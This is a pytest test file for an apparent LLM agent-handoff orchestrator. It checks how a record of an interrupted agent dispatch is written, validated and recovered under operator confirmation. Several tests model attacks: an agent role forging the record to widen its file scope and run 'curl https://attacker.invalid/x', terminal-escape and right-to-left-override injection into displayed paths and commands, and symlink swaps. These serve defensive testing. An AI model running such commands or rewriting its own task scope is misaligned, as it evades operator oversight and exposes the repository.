"""RECOVERY-2a/2b/2c/3b1: the in-flight record and interrupted-dispatch recovery."""

from __future__ import annotations

import importlib
import io
import json
import os
from pathlib import Path
import subprocess
import sys
from typing import Any
import unicodedata

import pytest

from llm_handoff.agents import DispatchResult
from llm_handoff.config import IN_FLIGHT_STATE_PATH, DispatchConfig
from llm_handoff.dispatcher_commit import PENDING_COMMIT_SHA
from llm_handoff.in_flight import (
    InFlightRecord,
    in_flight_record_payload,
    load_in_flight_record,
)
import llm_handoff.ledger as ledger
from llm_handoff.work_claim import carry_over_key


HANDOFF_RELATIVE_PATH = Path("docs/handoff/HANDOFF.md")
STORY_ID = "EPIC-1-S1"
PYTHON = sys.executable
PASS_COMMAND = f'"{PYTHON}" -c "import sys; sys.exit(0)"'


def _git(repo_root: Path, *args: str) -> str:
    completed = subprocess.run(
        ["git", "-C", str(repo_root), *args],
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
    )
    return completed.stdout.strip()


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8", newline="\n")


def _assignment() -> str:
    return f"""---
next_agent: backend
reason: "Implement the value change."
epic_id: EPIC-1
story_id: {STORY_ID}
story_title: Change the value
producer: planner
---

## Task Assignment

**Agent:** backend

## Work Packet

- **Objective:** Set VALUE to 2.
- **Files in scope:** src/app.py, tests/test_app.py
- **Files out of bounds:** src/api.py
- **Context:** Keep the module import-free.
- **Verification command:** {PASS_COMMAND}
- **Expected next route:** auditor
"""


def _planner_assignment() -> str:
    return """---
next_agent: planner
reason: "Plan the next story."
epic_id: EPIC-1
producer: auditor
---

## Next Step

Plan the next story.
"""


def _pending_claim() -> str:
    return f"""---
next_agent: auditor
reason: "Backend work complete; audit requested."
epic_id: EPIC-1
story_id: {STORY_ID}
story_title: Change the value
status: ready_for_review
producer: backend
---

# Backend Handback

## Completed Work

- Set VALUE to 2 in src/app.py.

## Verification Evidence

- **Commands run:** `python -m pytest tests/test_app.py -q`
- **Output summary:** exit 0
- **Commit SHA verified:** {PENDING_COMMIT_SHA}
- **Files changed or reviewed:** src/app.py
- **Unresolved concerns:** none
"""


HALF_WRITTEN_HANDOFF = "---\nnext_agent: aud"


def _init_repo(repo_root: Path, *, ignore_logs: bool = True, handoff: str | None = None) -> None:
    repo_root.mkdir(parents=True, exist_ok=True)
    _git(repo_root, "init", "-q")
    _git(repo_root, "config", "user.name", "llm-handoff tests")
    _git(repo_root, "config", "user.email", "tests@example.invalid")
    _git(repo_root, "config", "core.autocrlf", "false")
    _write(repo_root / "src" / "app.py", "VALUE = 1\n")
    _write(repo_root / "src" / "api.py", "API = 1\n")
    _write(repo_root / "tests" / "test_app.py", "def test_value():\n    assert True\n")
    _write(repo_root / HANDOFF_RELATIVE_PATH, handoff or _assignment())
    _write(repo_root / "PROJECT_STATE.md", "# PROJECT STATE\n")
    _write(repo_root / "AGENTS.md", "dispatch test fixture\n")
    if ignore_logs:
        _write(repo_root / ".gitignore", "logs/\n")
    _git(repo_root, "add", "-A")
    _git(repo_root, "commit", "-q", "-m", "initial")


def _config(repo_root: Path, **overrides: Any) -> DispatchConfig:
    kwargs: dict[str, Any] = {
        "repo_root": repo_root,
        "poll_interval_seconds": 0,
        "pause_recovery": "off",
        "max_consecutive_failures": 3,
        "enforce_work_packet": True,
        "work_packet_verification_timeout_seconds": 60,
        "commit_mode": "dispatcher",
        "audit": {
            "reviewers": ["quality"],
            "security_opt_out_reason": "Tests cover the single-auditor route.",
        },
    }
    kwargs.update(overrides)
    return DispatchConfig(**kwargs)


def _orchestrator():
    return importlib.import_module("llm_handoff.orchestrator")


def _collecting_log(messages: list[tuple[str, str]]):
    return lambda level, message: messages.append((level, message))


def _result(exit_code: int = 0) -> DispatchResult:
    return DispatchResult(stdout="", stderr="", exit_code=exit_code, elapsed_seconds=0.01)


def _record_path(repo_root: Path) -> Path:
    return repo_root / IN_FLIGHT_STATE_PATH


def _commit_files(repo_root: Path, sha: str) -> list[str]:
    return _git(repo_root, "show", "--name-only", "--format=", sha).splitlines()


def _no_input_stream() -> io.StringIO:
    raise AssertionError("the in-flight record must not read operator input")


def _set_terminal(
    orchestrator: Any,
    monkeypatch: pytest.MonkeyPatch,
    *,
    interactive: bool,
    operator_input: str | None,
) -> None:
    monkeypatch.setattr(
        orchestrator, "_operator_stdin_is_interactive", lambda: interactive
    )
    monkeypatch.setattr(
        orchestrator,
        "_operator_input_stream",
        (lambda: io.StringIO(operator_input))
        if operator_input is not None
        else _no_input_stream,
    )


@pytest.fixture(autouse=True)
def reset_story_bounce():
    ledger.reset_bounce(STORY_ID)
    yield
    ledger.reset_bounce(STORY_ID)


def _interrupt_backend(
    repo_root: Path,
    orchestrator: Any,
    monkeypatch: pytest.MonkeyPatch,
    *,
    operator_edit: bool = False,
) -> None:
    """Run one backend dispatch that is interrupted mid-dispatch.

    The backend changes src/app.py, half-writes the handoff, and is then
    interrupted; the record stays on disk. With ``operator_edit`` the
    operator's uncommitted src/api.py edit exists before the dispatch.
    """

    if operator_edit:
        _write(repo_root / "src" / "api.py", "API = 'operator'\n")

    def interrupted_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(repo_root / "src" / "app.py", "VALUE = 2\n")
        path.write_text(HALF_WRITTEN_HANDOFF, encoding="utf-8")
        raise KeyboardInterrupt

    monkeypatch.setattr(orchestrator, "invoke_backend_role", interrupted_backend)
    _set_terminal(orchestrator, monkeypatch, interactive=False, operator_input=None)
    with pytest.raises(KeyboardInterrupt):
        orchestrator.run_loop(_config(repo_root), max_cycles=1, log=lambda *_: None)
    assert _record_path(repo_root).exists()


# ---------------------------------------------------------------------------
# Record format
# ---------------------------------------------------------------------------


def _valid_payload() -> dict[str, Any]:
    record = InFlightRecord(
        cycle=3,
        role="backend",
        story_key=f"story:{STORY_ID}",
        phase="dispatch",
        head_sha="a" * 40,
        handoff_content=_assignment(),
        dirty_fingerprints=(("notes.txt", "f" * 64),),
        carried_over=("src/app.py",),
    )
    return json.loads(in_flight_record_payload(record))


def test_in_flight_record_round_trips_with_sorted_keys() -> None:
    record = InFlightRecord(
        cycle=3,
        role="frontend",
        story_key=f"story:{STORY_ID}",
        phase="dispatch",
        head_sha=None,
        handoff_content=_assignment(),
        dirty_fingerprints=(("notes.txt", "f" * 64),),
        carried_over=("src/app.py",),
    )
    text = in_flight_record_payload(record)
    payload = json.loads(text)

    assert list(payload) == sorted(payload)
    assert payload["version"] == 1
    assert load_in_flight_record(text) == record


@pytest.mark.parametrize(
    ("change", "value"),
    [
        pytest.param("version", 2, id="wrong_version"),
        pytest.param("version", "1", id="version_type"),
        pytest.param("role", "auditor", id="wrong_role"),
        pytest.param("phase", "commit", id="wrong_phase"),
        pytest.param("cycle", "3", id="cycle_type"),
        pytest.param("cycle", True, id="cycle_bool"),
        pytest.param("head_sha", 7, id="head_sha_type"),
        pytest.param("handoff_content", None, id="handoff_type"),
        pytest.param("dirty_fingerprints", {"notes.txt": "f"}, id="fingerprints_type"),
        pytest.param("dirty_fingerprints", [["notes.txt"]], id="fingerprint_pair"),
        pytest.param("carried_over", "src/app.py", id="carried_over_type"),
        pytest.param("carried_over", [1], id="carried_over_item"),
        pytest.param("story_key", 5, id="story_key_type"),
        pytest.param("story_key", "story:OTHER-1", id="story_key_mismatch"),
    ],
)
def test_load_in_flight_record_rejects(change: str, value: Any) -> None:
    payload = _valid_payload()
    payload[change] = value

    assert load_in_flight_record(json.dumps(payload)) is None


def test_load_in_flight_record_rejects_invalid_json_and_non_objects() -> None:
    assert load_in_flight_record("{not json") is None
    assert load_in_flight_record("[]") is None
    assert load_in_flight_record("") is None


def test_load_in_flight_record_requires_story_key_from_the_handoff() -> None:
    payload = _valid_payload()
    payload["handoff_content"] = _assignment().replace(STORY_ID, "EPIC-1-S9")

    assert load_in_flight_record(json.dumps(payload)) is None
    payload["story_key"] = carry_over_key(payload["handoff_content"])
    assert load_in_flight_record(json.dumps(payload)) is not None


# ---------------------------------------------------------------------------
# Write and clear around the dispatch
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("exit_code", [0, 1])
def test_record_exists_only_while_the_implementer_runs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    exit_code: int,
) -> None:
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    seen: list[dict[str, Any]] = []

    def fake_backend(path: Path, **_kwargs: object) -> DispatchResult:
        seen.append(json.loads(_record_path(tmp_path).read_text(encoding="utf-8")))
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result(exit_code)

    monkeypatch.setattr(orchestrator, "invoke_backend_role", fake_backend)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, max_consecutive_failures=1),
        max_cycles=1,
        log=_collecting_log(messages),
    )

    assert len(seen) == 1
    assert seen[0]["role"] == "backend"
    assert seen[0]["phase"] == "dispatch"
    assert seen[0]["cycle"] == 1
    assert seen[0]["story_key"] == f"story:{STORY_ID}"
    assert seen[0]["handoff_content"] == _assignment()
    assert seen[0]["head_sha"] == head
    assert not _record_path(tmp_path).exists()
    assert not any("in-flight" in message for _level, message in messages)


@pytest.mark.parametrize("exit_code", [0, 1])
def test_a_planner_record_exists_only_while_the_planner_runs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    exit_code: int,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    seen: list[dict[str, Any]] = []

    def fake_planner(path: Path, **_kwargs: object) -> DispatchResult:
        seen.append(json.loads(_record_path(tmp_path).read_text(encoding="utf-8")))
        path.write_text(_assignment(), encoding="utf-8")
        return _result(exit_code)

    monkeypatch.setattr(orchestrator, "invoke_planner_role", fake_planner)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, max_consecutive_failures=1),
        max_cycles=1,
        log=_collecting_log(messages),
    )

    assert len(seen) == 1
    assert seen[0]["role"] == "planner"
    assert seen[0]["phase"] == "dispatch"
    assert seen[0]["cycle"] == 1
    assert seen[0]["story_key"] is None
    assert seen[0]["handoff_content"] == _planner_assignment()
    assert seen[0]["head_sha"] == head
    assert seen[0]["dirty_fingerprints"] == []
    assert seen[0]["carried_over"] == []
    assert seen[0]["assignment_content"] is None
    assert seen[0]["handback_content"] is None
    assert isinstance(seen[0]["protected_digests"], list)
    assert load_in_flight_record(json.dumps(seen[0])) is not None
    assert not _record_path(tmp_path).exists()
    assert not any("in-flight" in message for _level, message in messages)


def test_an_interrupted_dispatch_leaves_the_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    head = _git(tmp_path, "rev-parse", "HEAD")

    _interrupt_backend(tmp_path, orchestrator, monkeypatch, operator_edit=True)

    record = load_in_flight_record(_record_path(tmp_path).read_text(encoding="utf-8"))
    assert record is not None
    assert record.role == "backend"
    assert record.head_sha == head
    assert record.handoff_content == _assignment()
    assert [path for path, _ in record.dirty_fingerprints] == ["src/api.py"]
    assert record.carried_over == ()


def test_no_record_and_one_warning_when_git_does_not_ignore_it(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, ignore_logs=False)
    orchestrator = _orchestrator()
    record_path = _record_path(tmp_path)
    _write(record_path, "operator file\n")
    seen: list[str] = []

    def failing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        seen.append(record_path.read_text(encoding="utf-8"))
        return _result(1)

    monkeypatch.setattr(orchestrator, "invoke_backend_role", failing_backend)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, max_consecutive_failures=2),
        max_cycles=3,
        log=_collecting_log(messages),
    )

    assert seen == ["operator file\n", "operator file\n"]
    assert record_path.read_text(encoding="utf-8") == "operator file\n"
    dispatch_warnings = [
        message
        for level, message in messages
        if level == "WARN" and message.startswith("No in-flight record is kept")
    ]
    assert len(dispatch_warnings) == 1
    assert "Git does not ignore logs/dispatch/in-flight.json" in dispatch_warnings[0]
    assert any(
        level == "WARN"
        and message.startswith("Left the in-flight record")
        and "untouched" in message
        for level, message in messages
    )


def test_no_record_without_a_race_safe_mechanism(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    monkeypatch.setattr(orchestrator, "_CARRY_OVER_DIR_FD_SUPPORTED", False)
    monkeypatch.setattr(orchestrator, "_CARRY_OVER_WINDOWS_PIN_SUPPORTED", False)
    seen: list[bool] = []

    def failing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        seen.append(_record_path(tmp_path).exists())
        return _result(1)

    monkeypatch.setattr(orchestrator, "invoke_backend_role", failing_backend)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, max_consecutive_failures=2),
        max_cycles=3,
        log=_collecting_log(messages),
    )

    assert seen == [False, False]
    warnings = [
        message
        for level, message in messages
        if level == "WARN" and message.startswith("No in-flight record is kept")
    ]
    assert len(warnings) == 1
    assert "directory-swap race" in warnings[0]


# ---------------------------------------------------------------------------
# Startup recovery
# ---------------------------------------------------------------------------


def test_confirmed_recovery_re_dispatches_the_role_and_commits_its_files(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF

    calls: list[dict[str, Any]] = []

    def finishing_backend(path: Path, **kwargs: object) -> DispatchResult:
        calls.append({"handoff": path.read_text(encoding="utf-8"), **kwargs})
        _write(tmp_path / "tests" / "test_app.py", "def test_value():\n    pass\n")
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    assert (
        "INFO",
        f"Recover backend's interrupted {STORY_ID} work? [y/N]",
    ) in messages
    assert not any("Carry these over" in message for _level, message in messages)
    prompt_index = messages.index(
        ("INFO", f"Recover backend's interrupted {STORY_ID} work? [y/N]")
    )
    disclosure_level, disclosure_line = messages[prompt_index - 1]
    assert disclosure_level == "INFO"
    assert "protected-file baseline" in disclosure_line
    assignment_level, assignment_line = messages[prompt_index - 2]
    assert assignment_level == "INFO"
    assert "cannot verify" in assignment_line
    assert "Files in scope: src/app.py, tests/test_app.py" in assignment_line
    assert "Files out of bounds: src/api.py" in assignment_line
    assert f"Verification commands: {PASS_COMMAND}" in assignment_line
    assert any(
        level == "INFO" and message.startswith("Restored the half-written handoff")
        for level, message in messages
    )
    assert ("INFO", "Routing source: interrupted_dispatch_recovery") in messages
    assert (
        "INFO",
        f"Carrying over uncommitted work from the previous {STORY_ID} "
        "dispatch: src/app.py.",
    ) in messages
    assert len(calls) == 1
    assert calls[0]["handoff"] == _assignment()
    instruction = str(calls[0]["additional_instruction"])
    assert "interrupted before you handed back" in instruction
    assert "<<<INTERRUPTED DISPATCH FILES>>>\nsrc/app.py\n" in instruction
    committed = _commit_files(tmp_path, "HEAD")
    assert "src/app.py" in committed
    assert "tests/test_app.py" in committed
    assert not _record_path(tmp_path).exists()


@pytest.mark.parametrize(
    ("interactive", "operator_input", "interactive_pause"),
    [
        pytest.param(False, None, True, id="no_tty"),
        pytest.param(True, "n\n", True, id="tty_declines"),
        pytest.param(True, "", True, id="tty_eof"),
        pytest.param(True, None, False, id="interactive_pause_off"),
    ],
)
def test_unconfirmed_recovery_discards_the_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    interactive: bool,
    operator_input: str | None,
    interactive_pause: bool,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    _set_terminal(
        orchestrator,
        monkeypatch,
        interactive=interactive,
        operator_input=operator_input,
    )
    config = _config(tmp_path, interactive_pause=interactive_pause)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        config, _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    asked = any("[y/N]" in message for _level, message in messages)
    assert asked == (interactive and interactive_pause)
    assert any(
        level == "WARN"
        and "Discarded the in-flight record" in message
        and "src/app.py" in message
        and "stay operator edits" in message
        for level, message in messages
    )
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF
    assert not (tmp_path / "logs" / "dispatch" / "carry-over.json").exists()


def test_dry_run_keeps_the_record_and_dispatches_nothing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    original = _record_path(tmp_path).read_text(encoding="utf-8")

    def refusing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        raise AssertionError("dry run must not dispatch")

    monkeypatch.setattr(orchestrator, "invoke_backend_role", refusing_backend)
    # The half-written handoff does not route; its validator is not under test.
    monkeypatch.setattr(
        orchestrator, "_run_unknown_route_validator", lambda _config, _log: None
    )
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, dry_run=True), max_cycles=1, log=_collecting_log(messages)
    )

    assert _record_path(tmp_path).read_text(encoding="utf-8") == original
    found = [
        message
        for level, message in messages
        if level == "INFO" and message.startswith("Found in-flight record")
    ]
    assert len(found) == 1
    assert "backend" in found[0]
    assert STORY_ID in found[0]
    assert "src/app.py" in found[0]
    assert found[0].endswith("Not applied in dry run.")
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF


def test_a_changed_operator_file_pauses_the_first_cycle_and_is_never_staged(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    # The operator's in-scope edit to tests/test_app.py exists before the
    # dispatch, and the operator changes it again while the backend is down.
    _write(tmp_path / "tests" / "test_app.py", "# operator draft\n")
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    _write(tmp_path / "tests" / "test_app.py", "# operator draft, revised\n")

    dispatches: list[int] = []

    def counting_backend(path: Path, **_kwargs: object) -> DispatchResult:
        dispatches.append(1)
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "invoke_backend_role", counting_backend)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    assert dispatches == []
    pauses = [
        message
        for level, message in messages
        if level == "PAUSE" and message.startswith("INTERRUPTED DISPATCH:")
    ]
    assert len(pauses) == 1
    assert "tests/test_app.py" in pauses[0]
    assert "never stages or commits" in pauses[0]
    assert not _record_path(tmp_path).exists()
    # The handoff was restored, and the next start dispatches the backend
    # normally: the agent's file is committed, the operator's file is not.
    assert (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8") == _assignment()
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages.clear()

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    assert dispatches == [1]
    assert _commit_files(tmp_path, "HEAD") == ["src/app.py"]
    assert "tests/test_app.py" in _git(tmp_path, "status", "--porcelain")


def test_nothing_to_recover_deletes_the_record_without_asking(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    # The operator put everything back before starting again.
    _git(tmp_path, "checkout", "--", ".")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert not _record_path(tmp_path).exists()
    assert [level for level, _message in messages] == ["INFO"]
    assert "left nothing to recover" in messages[0][1]


def test_an_invalid_record_is_deleted_with_a_warning(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _write(_record_path(tmp_path), "{not json")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert not _record_path(tmp_path).exists()
    assert [level for level, _message in messages] == ["WARN"]
    assert "not valid" in messages[0][1]


def test_recovery_prompt_escapes_control_characters_in_paths(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    # Filesystems reject such paths, so Git's listing is stubbed.
    evil = "src/evil\x1b]0;x\x07\n.py"
    monkeypatch.setattr(orchestrator, "git_dirty_files", lambda _root: (evil,))
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="n\n")
    messages: list[tuple[str, str]] = []

    orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    # Found, assignment, protected-file disclosure, question, discard.
    assert len(messages) == 5
    for _level, message in messages:
        assert not any(unicodedata.category(char) == "Cc" for char in message)
    assert "src/evil\\x1b]0;x\\x07\\x0a.py" in messages[0][1]
    assert "src/evil\\x1b]0;x\\x07\\x0a.py" in messages[4][1]
    assert ("INFO", f"Recover backend's interrupted {STORY_ID} work? [y/N]") in messages


def test_a_forged_record_shows_its_assignment_before_the_prompt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # A role rewrites the record before the interruption: same story, but a
    # broader Work Packet and its own Verification command. The record cannot
    # be authenticated, so the operator sees that assignment before answering,
    # and declining restores nothing.
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    forged_handoff = (
        _assignment()
        .replace(
            "**Files in scope:** src/app.py, tests/test_app.py",
            "**Files in scope:** src/app.py, tests/test_app.py, src/api.py, .github/",
        )
        .replace("**Files out of bounds:** src/api.py", "**Files out of bounds:** none")
        .replace(
            f"**Verification command:** {PASS_COMMAND}",
            "**Verification command:** curl https://attacker.invalid/x\x1b[2J",
        )
    )
    payload = json.loads(_record_path(tmp_path).read_text(encoding="utf-8"))
    payload["handoff_content"] = forged_handoff
    payload["story_key"] = carry_over_key(forged_handoff)
    _record_path(tmp_path).write_text(json.dumps(payload), encoding="utf-8")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="n\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    prompt = ("INFO", f"Recover backend's interrupted {STORY_ID} work? [y/N]")
    assert prompt in messages
    before_prompt = messages[: messages.index(prompt)]
    shown = [
        message
        for level, message in before_prompt
        if level == "INFO" and "cannot verify" in message
    ]
    assert len(shown) == 1
    assert "src/api.py, .github/" in shown[0]
    assert "Files out of bounds: none" in shown[0]
    assert "curl https://attacker.invalid/x\\x1b[2J" in shown[0]
    assert not any(unicodedata.category(char) == "Cc" for char in shown[0])
    assert not any(
        "pre-dispatch text" in message for _level, message in before_prompt
    )
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF
    assert not _record_path(tmp_path).exists()
    assert not (tmp_path / "logs" / "dispatch" / "carry-over.json").exists()


_UNSAFE_DISPLAY_CATEGORIES = {"Cc", "Cf", "Cs", "Zl", "Zp"}


def test_escape_control_characters_escapes_format_and_separator_controls() -> None:
    orchestrator = _orchestrator()
    text = "a\u202eb\u2066c\u200fd\u2028e\x1bf"

    escaped = orchestrator._escape_control_characters(text)

    assert escaped.isascii()
    assert escaped == "a\\u202eb\\u2066c\\u200fd\\u2028e\\x1bf"
    letters = escaped
    for escape in ("\\u202e", "\\u2066", "\\u200f", "\\u2028", "\\x1b"):
        assert escape in escaped
        letters = letters.replace(escape, "")
    assert letters == "abcdef"
    path = "src/caf\u00e9/\u65e5.py"
    assert orchestrator._escape_control_characters(path) == path


def test_forged_record_bidi_controls_are_escaped_in_the_approval_summary(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # A forged Verification command uses a right-to-left override to reorder
    # what the operator reads; the approval summary shows it escaped.
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    forged_handoff = _assignment().replace(
        f"**Verification command:** {PASS_COMMAND}",
        "**Verification command:** python -m pytest tests -q \u202e#gnirts-eman",
    )
    payload = json.loads(_record_path(tmp_path).read_text(encoding="utf-8"))
    payload["handoff_content"] = forged_handoff
    payload["story_key"] = carry_over_key(forged_handoff)
    _record_path(tmp_path).write_text(json.dumps(payload), encoding="utf-8")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="n\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    for _level, message in messages:
        assert not any(
            unicodedata.category(char) in _UNSAFE_DISPLAY_CATEGORIES
            for char in message
        )
    listing = [
        message for _level, message in messages if "Verification commands:" in message
    ]
    assert len(listing) == 1
    assert "\\u202e#gnirts-eman" in listing[0]
    assert not _record_path(tmp_path).exists()


def _link_directory(link: Path, target: Path) -> None:
    link.parent.mkdir(parents=True, exist_ok=True)
    try:
        os.symlink(target, link, target_is_directory=True)
        return
    except (OSError, NotImplementedError):
        pass
    if sys.platform != "win32":
        pytest.skip("cannot create a directory symlink here")
    import _winapi

    _winapi.CreateJunction(str(target), str(link))


def test_a_record_behind_a_link_is_not_read_or_deleted(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    _init_repo(repo)
    record = InFlightRecord(
        cycle=1,
        role="backend",
        story_key=f"story:{STORY_ID}",
        phase="dispatch",
        head_sha=None,
        handoff_content=_assignment(),
        dirty_fingerprints=(),
        carried_over=(),
    )
    external = outside / IN_FLIGHT_STATE_PATH.name
    _write(external, in_flight_record_payload(record))
    original = external.read_text(encoding="utf-8")
    _link_directory(repo / "logs" / "dispatch", outside)
    _write(repo / "src" / "app.py", "VALUE = 2\n")
    orchestrator = _orchestrator()
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []
    config = _config(repo)

    outcome = orchestrator._recover_interrupted_dispatch(
        config, _collecting_log(messages), orchestrator._OperatorPromptState()
    )
    orchestrator._delete_in_flight_record(config, _collecting_log(messages))

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert external.read_text(encoding="utf-8") == original
    assert [level for level, _message in messages] == ["WARN", "WARN"]
    assert all("symlink or junction" in message for _level, message in messages)


def _plain_record_payload() -> str:
    return in_flight_record_payload(
        InFlightRecord(
            cycle=1,
            role="backend",
            story_key=f"story:{STORY_ID}",
            phase="dispatch",
            head_sha=None,
            handoff_content=_assignment(),
            dirty_fingerprints=(),
            carried_over=(),
        )
    )


def _can_symlink_files(tmp_path: Path) -> bool:
    target = tmp_path / "symlink-probe-target"
    link = tmp_path / "symlink-probe-link"
    target.write_text("", encoding="utf-8")
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError):
        return False
    link.unlink()
    target.unlink()
    return True


@pytest.mark.parametrize("swapped", ["directory", "file"])
def test_a_link_swapped_in_after_the_link_check_is_not_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    swapped: str,
) -> None:
    # The path is clean when the preliminary link check runs; right after it,
    # logs/dispatch (or the record itself) is swapped for a link to a valid
    # record outside the repository. The reader walks the path again without
    # following links, so the outside record is neither read nor deleted.
    if swapped == "file" and not _can_symlink_files(tmp_path):
        pytest.skip("cannot create a file symlink here")
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    _init_repo(repo)
    _write(_record_path(repo), _plain_record_payload())
    external = outside / IN_FLIGHT_STATE_PATH.name
    _write(external, _plain_record_payload())
    original = external.read_text(encoding="utf-8")
    _write(repo / "src" / "app.py", "VALUE = 2\n")
    orchestrator = _orchestrator()
    real_check = orchestrator._carry_over_path_traverses_link
    swaps: list[str] = []

    def check_then_swap(path: Path) -> bool:
        result = real_check(path)
        if not swaps and path.name == IN_FLIGHT_STATE_PATH.name:
            swaps.append(swapped)
            if swapped == "directory":
                dispatch_dir = repo / "logs" / "dispatch"
                os.rename(dispatch_dir, repo / "logs" / "moved")
